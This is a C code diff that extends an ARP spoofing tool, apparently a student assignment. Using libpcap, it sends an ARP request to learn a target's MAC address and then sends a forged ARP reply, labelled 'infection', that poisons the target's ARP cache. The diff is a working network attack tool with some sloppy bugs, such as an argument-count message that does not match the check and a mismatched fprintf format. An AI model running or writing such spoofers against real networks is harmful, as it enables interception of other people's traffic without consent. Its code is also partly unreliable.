@@ -23,21 +23,120 @@ struct makearphdr
     uint16_t ar_op;
 };
 
+void make_t_mac(const u_char *packet,u_int8_t a[]); //get mac addr from reply
+
 int main(int argc, char *argv[])
 {
+    if(argc != 5) //fix 4!!
+    {
+        printf("you must enter 4 parameter!!\n ");
+        printf(" <dev> <sender ip> <target ip> \n");
+        return 0;
+    }
+    char *dev=argv[1];
+    /*
+    FILE *mymac;
+    char buff[1024];
+    mymac = popen("ifconfig -a | grep ether | awk '{print $2}'","r");
+    if(NULL==mymac)
+    {
+        printf("error\n");
+        return -1;
+    }
+    while(fgets(buff,1024,mymac))
+        printf("%s",buff); // no string............fix
 
-        if(argc != 6)
+    pclose(mymac);
+
+*/
+    Mac des_mac;
+    des_mac="ff:ff:ff:ff:ff:ff";
+
+    Mac sor_mac; //auto check..         <-fix later
+    sor_mac=argv[4];//                  <-fix later
+
+
+    uint16_t etype = htons(0x0806);
+
+    struct makearphdr rq;
+
+    rq.ar_hrd = htons(0x0001);
+    rq.ar_pro = htons(0x0800);
+    rq.ar_hln = 0x06;
+    rq.ar_pln = 0x04;
+    rq.ar_op  = htons(0x0001);
+
+    Mac arpsm;//auto check..    <-fix later
+    arpsm=argv[4];//            <-fix later
+    char *seip=argv[2];
+    uint32_t asip;         //<-fix because not gateway ip , my pc ip
+    inet_pton(AF_INET, seip, &asip);
+
+    Mac arptm;
+    arptm="ff:ff:ff:ff:ff:ff";
+
+    char *taip=argv[3];
+    uint32_t atip;
+    inet_pton(AF_INET, taip, &atip);
+
+    uint8_t rq_packet[42]; //make complete packet
+
+    memset(rq_packet,0,42);
+
+    memcpy(rq_packet,&des_mac,6);
+    memcpy(rq_packet+6,&sor_mac,6);
+    memcpy(rq_packet+12,&etype,2);
+    memcpy(rq_packet+14,&rq.ar_hrd,2);
+    memcpy(rq_packet+16,&rq.ar_pro,2);
+    memcpy(rq_packet+18,&rq.ar_hln,1);
+    memcpy(rq_packet+19,&rq.ar_pln,1);
+    memcpy(rq_packet+20,&rq.ar_op,2);
+    memcpy(rq_packet+22,&arpsm,6);
+    memcpy(rq_packet+28,&asip,4);// <--fix
+    memcpy(rq_packet+32,&arptm,6);
+    memcpy(rq_packet+38,&atip,4);
+
+
+
+    pcap_t *fp;
+    char errbuf[PCAP_ERRBUF_SIZE];
+    //---------------------------------------------------------------------------------------send request arp
+    fp=pcap_open_live(dev,BUFSIZ,0,1,errbuf);
+    if(fp==NULL)
+    {
+        printf("%s\n",errbuf);
+        return 0;
+    }
+    if(pcap_sendpacket(fp,(u_char*)rq_packet,42) != 0)
+    {
+        fprintf(stderr,"\n Error sending the packet:\n",pcap_geterr(fp));
+    }
+  /*  /////////////////////////////////////////////////////////////////////////////////////////////////*/
+    const u_char *pkt_data;     // why?
+    struct pcap_pkthdr *header; // why?
+
+
+    int res;
+    u_int8_t tm[6]; //tm, arp_tm -> get reply from mac addr
+    while((res=pcap_next_ex(fp, &header, &pkt_data))>=0)
+    {
+        if(res==1)
         {
-            printf("you must enter 6 parameter!!\n ");
-            printf(" <dev> <sender ip> <target ip> <sender mac> <target mac>\n");
-            return 0;
+            make_t_mac(pkt_data,tm); // get reply data -> target mac
         }
-        char *dev=argv[1];
+        break;
+    }
+
+
+
+
+/*//////////////////////////////////////////////////////infection reply start//////////////////////////////////////////////////////////////*/
+
+
 //--------------------------------------------------------------------------------------ethernet protocol
-        Mac sm,tm;
-        tm=argv[4];
-        sm=argv[5];
-       
+        Mac sm;
+        sm=argv[4];
+
         u_int16_t ether_type=htons(0x0806);
 //---------------------------------------------------------------------------------------arp protocol
         struct makearphdr ap;
@@ -47,7 +146,7 @@ int main(int argc, char *argv[])
         ap.ar_hln = 0x06;
         ap.ar_pln = 0x04;
         ap.ar_op  = htons(0x0002);
-        Mac arp_sm,arp_tm;
+        Mac arp_sm;
 
 
         arp_sm = argv[4];
@@ -55,7 +154,6 @@ int main(int argc, char *argv[])
         u_int32_t s_ip;
         inet_pton(AF_INET, arp_sip, &s_ip);
 
-        arp_tm = argv[5];
         char *arp_tip = argv[3];
         u_int32_t t_ip;
         inet_pton(AF_INET, arp_tip, &t_ip);
@@ -64,8 +162,8 @@ int main(int argc, char *argv[])
         uint8_t packet[42]; //make complete packet
 
         memset(packet,0,42);
-        memcpy(packet,&sm,6);
-        memcpy(packet+6,&tm,6);
+        memcpy(packet,&tm,6);
+        memcpy(packet+6,&sm,6);
         memcpy(packet+12,&ether_type,2);
         memcpy(packet+14,&ap.ar_hrd,2);
         memcpy(packet+16,&ap.ar_pro,2);
@@ -74,24 +172,27 @@ int main(int argc, char *argv[])
         memcpy(packet+20,&ap.ar_op,2);
         memcpy(packet+22,&arp_sm,6);
         memcpy(packet+28,&s_ip,4);
-        memcpy(packet+32,&arp_tm,6);
+        memcpy(packet+32,&tm,6);
         memcpy(packet+38,&t_ip,4);
-    
-        pcap_t *fp;
-        char errbuf[PCAP_ERRBUF_SIZE];
-        //---------------------------------------------------------------------------------------send arp
-        fp=pcap_open_live(dev,BUFSIZ,0,1,errbuf);
-        if(fp==NULL)
+
+        pcap_t *fpp;
+
+        //---------------------------------------------------------------------------------------send reply arp
+        fpp=pcap_open_live(dev,BUFSIZ,0,1,errbuf);
+        if(fpp==NULL)
         {
             printf("%s\n",errbuf);
             return 0;
         }
-        if(pcap_sendpacket(fp,(u_char*)packet,42) != 0)
+        if(pcap_sendpacket(fpp,(u_char*)packet,42) != 0)
         {
-            fprintf(stderr,"\n Error sending the packet:\n",pcap_geterr(fp));
+            fprintf(stderr,"\n Error sending the packet:\n",pcap_geterr(fpp));
         }
-
-
 }
 
+void make_t_mac(const u_char *packet,u_int8_t a[])
+{
+    struct ether_header *ep = (struct ether_header *)packet;
+    memcpy(a,ep->ether_shost,6);
+}
 
